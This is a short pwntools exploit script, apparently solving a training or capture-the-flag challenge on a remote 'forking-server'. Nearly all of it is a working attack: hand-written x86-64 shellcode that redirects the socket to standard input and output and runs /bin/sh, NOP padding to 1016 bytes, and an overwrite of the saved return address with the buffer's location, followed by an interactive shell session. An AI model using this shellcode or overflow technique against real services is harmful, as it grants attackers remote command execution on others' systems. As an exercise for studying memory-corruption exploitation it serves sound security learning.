from pwn import *

c = remote('forking-server.training.offensivedefensive.it', 8080, ssl = True)

#char s[1008]

#1016 bytes to reach the saved rbp
#plus 8 bytes to overwrite the saved rip with the address of the buffer

#to_send = b"\x90" * 16
to_send = b"\x48\xC7\xC0\x21\x00\x00\x00\x48\x31\xF6\x0F\x05\x48\xC7\xC0\x21\x00\x00\x00\x48\x31\xF6\x48\x83\xC6\x01\x0F\x05\x48\xC7\xC0\x3B\x00\x00\x00\x48\x31\xF6\x48\x31\xD2\x48\xBB\x2F\x62\x69\x6E\x2F\x73\x68\x00\x53\x48\x89\xE7\x0F\x05"
#57 bytes written till here
to_send += b"\x90" * 959
#1016 bytes have been written
to_send += b"\x00\x41\x40\x00\x00\x00\x00\x00"
# saved rip overwritten


#c.recvuntil(b'name?\n')
c.send(to_send)


c.interactive()